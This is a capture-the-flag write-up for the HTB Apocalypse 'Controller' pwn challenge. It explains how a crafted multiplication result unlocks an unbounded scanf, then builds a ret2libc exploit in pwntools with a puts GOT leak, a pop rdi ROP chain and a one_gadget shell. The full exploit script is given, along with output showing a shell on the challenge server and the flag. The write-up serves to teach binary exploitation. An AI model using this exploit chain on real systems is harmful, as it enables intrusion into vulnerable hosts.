# Controller

The description of the challenge is as follows:

*The extraterrestrials have a special controller in order to manage and use our resources wisely, in order to produce state of the art technology gadgets and weapons for them. If we gain access to the controller's server, we can make them drain the minimum amount of resources or even stop them completeley. Take action fast!
This challenge will raise 33 euros for a good cause.*

This was the easiest of the pwn challenges with a rating of one out of four stars, and it represents a very straightforward ret2libc challenge with a small amount of reverse engineering. As a result, I will walk through the process of a ret2libc attack in a fair amount of detail here, and then skim over the process in subsequent writeups.

**TL;DR Solution:** Figure out how to trigger an poorly designed error condition that allows for unlimited, buffer-overflowing input. Then perform ret2libc and gain shell.

So, the first step is to run the program to get a feel for what it does. It appears to be some kind of simple calculator that will prompt the user for new calculations in an endless loop.

```
knittingirl@piglet:~/CTF/HTBApocalypse/controller_files$ ./controller

👾 Control Room 👾

Insert the amount of 2 different types of recources: 23
45
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 3
23 * 45 = 1035
Insert the amount of 2 different types of recources: ^C

```

And we also run checksec on the binary; NX is enabled, so no shellcode, and there is also full RELRO, so overwriting GOT entries would be tricky or impossible.

```
[*] '/home/knittingirl/CTF/HTBApocalypse/controller_files/controller'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

Nothing here looks like an obvious overflow, so I start to reverse engineer the code with ghidra. The main() function first calls welcome(), which just displays some of the initial text, followed by calculator, which is much more interesting. The calculator() function calls calc(), which gets the numbers and performs the calculation. The most notable aspect of reverse engineering calc() is that neither of our inputs can exceed 0x45; otherwise, we will trigger an exit condition. The relevant code snippet is below:

```
  if ((0x45 < (int)input_1) || (0x45 < (int)input_2)) {
    printstr("We cannot use these many resources at once!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x69);
  }
```

To return to calculator() we can see that the result of the calculation is returned by calc() and stored in a stack variable within calculator(). The interesting part is that if the results of your calculation are equal to a certain number, displayed in ghidra as 0xff3a, then it will use __isoc99_scanf() to take a user string that is unbounded in length, so it will probably give us a very usable buffer overflow. 

```
  local_c = calc();
  if (local_c == 0xff3a) {
    printstr("Something odd happened!\nDo you want to report the problem?\n> ");
    __isoc99_scanf("%s",local_28);
    if ((local_28[0] == 'y') || (local_28[0] == 'Y')) {
      printstr("Problem reported!\n");
    }
    else {
      printstr("Problem ingored\n");
    }
  }
  else {
    calculator();
  }
  return;
}
```

To exploit this fact, note that 0xff3a is equal to the signed decimal -188. As a result, an easy way to trigger this condition would be to input -18 and 11 and select the option to multiply them together, which should equal -188. At this point, I created a simple python script to do just this and send in a cyclic() string from pwntools as my payload. This is an easy way to determine how many characters we have to write until we start overflowing the stack pointer, which we need to know in order to eventually build a ROPchain. The python code to that is here:

```
from pwn import *

target = process('./controller', env={"LD_PRELOAD":"./libc.so.6"})


pid = gdb.attach(target, "\nb *calculator+151\n set disassembly-flavor intel\ncontinue")

#target = remote('206.189.121.131', 30388)

elf = ELF("controller")
libc = ELF("libc.so.6")

print(target.recvuntil(b'Insert the amount of 2 different types of recources:'))

target.sendline(b'-18')
target.sendline(b'11')

print(target.recvuntil(b'4.'))
	
target.sendline(b'3')

print(target.recvuntil(b'Do you want to report the problem?'))

payload = cyclic(500)

target.sendline(payload)

target.interactive()
```

The breakpoint in gdb leaves us at the very end of the calculator function. If we view the contents of the rsp register, we can see that it has been filled with the end of our cyclic payload; comparing the portion displayed here demonstrates that we need a padding length of 40 characters. 
```
Breakpoint 1, 0x00000000004010fd in calculator ()
gef➤  x/s $rsp
0x7ffed9928db8:	"kaaalaaamaaanaaaoaaapaaaq ...
```

Now we can actually start on our ret2libc attack! The basis of this attack is that instead of writing shellcode, we chain together a series of calls to functions that already exist within the binary and associated libc file, which will ideally allow us to gain shell access.

Firstly, we need to ensure that we can leak a libc address every time we execute our script. This is because ASLR (a security feature that will pretty much always be enabled in modern systems) will give all your libc addresses a random base, but each function will be at a constant offset from that base as determined by the libc that is being used. As a result, if we can leak the libc address of a known function, then we determine the libc address of any other function in the libc file, like system(). 

The general strategy to perform a libc leak is to call a function that will write output to the console, such as puts(). We will be leaking the contents of one of the entries of the Global Offset Table, or GOT; basically, the GOT is an area of the binary that contains entries for each libc function that link to addresses in the libc file, so dumping out the contents of the GOT will give us the libc address of a known function. 

So, the basic chain we need to construct is to pop the address of a GOT entry into the rdi register, which will make it the first paramter of our call of the puts() function. Then we call puts to print our libc leak, and then we call main in order to get the opportunity to enter another ROP chain that uses the leak. I personally like to get PLT entry offsets from Ghidra, GOT from gdb will the binary is running (just type got), and the pop rdi gadget from ROPgadget (it comes with pwntools, use something like ROPgadget --binary controller | grep "pop rdi"). The portion of python code to get our libc leak is below:

```
#Gadgets:

puts_got_plt = p64(0x601fb0)
puts_plt = p64(0x00400630)
pop_rdi = p64(0x00000000004011d3) # : pop rdi ; ret
main = p64(0x00401124)

padding = b'a' * 40

payload = padding
payload += pop_rdi
payload += puts_got_plt
payload += puts_plt
payload += main

target.sendline(payload)
result = target.recvuntil(b'Control Room')
result_list = result.split(b'\n')
leak_unproc = result_list[2]
leak_unproc += b'\x00' * 2
puts_libc = u64(leak_unproc)

print(hex(puts_libc))
libc_base = puts_libc - libc.symbols['puts']
``` 

Running the script should get us output as reproduced below; check the GOT table in gdb to ensure that the printed value matches the GOT entry for the leaked puts function:

```
ubuntu@ubuntu1804:~/CTF/HTBApocalypse/controller_files$ python3 controller_writeup.py NOPTRACE
[+] Starting local process './controller': pid 2745
[!] Skipping debug attach since context.noptrace==True
[*] '/home/ubuntu/CTF/HTBApocalypse/controller_files/controller'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/ubuntu/CTF/HTBApocalypse/controller_files/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'\x1b[1;6;31m\n\xf0\x9f\x91\xbe Control Room \xf0\x9f\x91\xbe\n\n\x1b[0mInsert the amount of 2 different types of recources:'
b' Choose operation:\n\n1. \xe2\x9e\x95\n\n2. \xe2\x9e\x96\n\n3. \xe2\x9d\x8c\n\n4.'
b' \xe2\x9e\x97\n\n> -18 * 11 = 65338\nSomething odd happened!\nDo you want to report the problem?'
0x7f2bc9073aa0

```

Now, you could use the libc base that you have derived in order to offsets for the system() function and a /bin/sh string within the libc library, then pop the string into rdi and call system() in order to get a shell. However, a nice alternative is onegadget. We call onegadget on the provided binary, like so:

```
knittingirl@piglet:~/CTF/HTBApocalypse/controller_files$ one_gadget libc.so.6
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```
Each of the addresses are possible libc offsets you could use to get a shell with a single call, provided the constraints for that gadget are met. If you have a very long, unbounded input, you can typically force constraints like [rsp+0x40] == NULL by appending a lot of nulls to your input after the actual payload; however, the constraints are often satisfied regardless on at least one of the gadgets. 

As a result, the final step of the exploit is simply to fulfill the requirements to get to the condition where you can enter input again, just like last time, then enter a payload that consists of the required padding and the calculated location of the onegadget; in this case, the first onegadget worked without issue. The full python script is here:

```
from pwn import *

#Note: The ld_preload trick tends not to work on Kali. I have a bionic beaver VM I run these on if necessary.
#target = process('./controller', env={"LD_PRELOAD":"./libc.so.6"})

#pid = gdb.attach(target, "\nb *calculator+151\n set disassembly-flavor intel\ncontinue")

#Insert here
target = remote('206.189.121.131', 30388)

elf = ELF("controller")
libc = ELF("libc.so.6")

#Gadgets:

puts_got_plt = p64(0x601fb0)
puts_plt = p64(0x00400630)
pop_rdi = p64(0x00000000004011d3) # : pop rdi ; ret
main = p64(0x00401124)
onegadget_offset = 0x4f3d5

print(target.recvuntil(b'Insert the amount of 2 different types of recources:'))

#I can hit the error with -18 11 then 3
target.sendline(b'-18')
target.sendline(b'11')

print(target.recvuntil(b'4.'))
	
target.sendline(b'3')

print(target.recvuntil(b'Do you want to report the problem?'))

padding = b'a' * 40

payload = padding
payload += pop_rdi
payload += puts_got_plt
payload += puts_plt
payload += main

target.sendline(payload)
result = target.recvuntil(b'Control Room')
result_list = result.split(b'\n')
leak_unproc = result_list[2]
leak_unproc += b'\x00' * 2
puts_libc = u64(leak_unproc)

print(hex(puts_libc))
libc_base = puts_libc - libc.symbols['puts']
strlen_libc = libc_base + libc.symbols["strlen"]
onegadget = libc_base + onegadget_offset
#Verifying my offsets work. I compare the output here with the GOT entry for strlen in gdb.
print(hex(strlen_libc))

print(target.recvuntil(b'Insert the amount of 2 different types of recources:'))
target.sendline(b'-18')
target.sendline(b'11')
print(target.recvuntil(b'4.'))
target.sendline(b'3')
print(target.recvuntil(b'Do you want to report the problem?'))


payload = padding
payload += p64(onegadget)
target.sendline(payload)

target.interactive()
```


And the output looks like this:

```
knittingirl@piglet:~/CTF/HTBApocalypse$ python3 controller_payload.py 
[+] Opening connection to 206.189.121.131 on port 30388: Done
[*] '/home/knittingirl/CTF/HTBApocalypse/controller'
[+] Opening connection to 206.189.121.131 on port 30388: Done
[*] '/home/knittingirl/CTF/HTBApocalypse/controller'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/knittingirl/CTF/HTBApocalypse/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'\x1b[1;6;31m\n\xf0\x9f\x91\xbe Control Room \xf0\x9f\x91\xbe\n\n\x1b[0mInsert the amount of 2 different types of recources:'
b' Choose operation:\n\n1. \xe2\x9e\x95\n\n2. \xe2\x9e\x96\n\n3. \xe2\x9d\x8c\n\n4.'
b' \xe2\x9e\x97\n\n> -18 * 11 = 65338\nSomething odd happened!\nDo you want to report the problem?'
0x7ff38d99faa0
0x7ff38d9bcdb0
b' \xf0\x9f\x91\xbe\n\n\x1b[0mInsert the amount of 2 different types of recources:'
b' Choose operation:\n\n1. \xe2\x9e\x95\n\n2. \xe2\x9e\x96\n\n3. \xe2\x9d\x8c\n\n4.'
b' \xe2\x9e\x97\n\n> -18 * 11 = 65338\nSomething odd happened!\nDo you want to report the problem?'
[*] Switching to interactive mode

> Problem ingored
$ whoami
ctf
$ ls
controller  flag.txt  libc.so.6
$ cat flag.txt
CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
$  

```
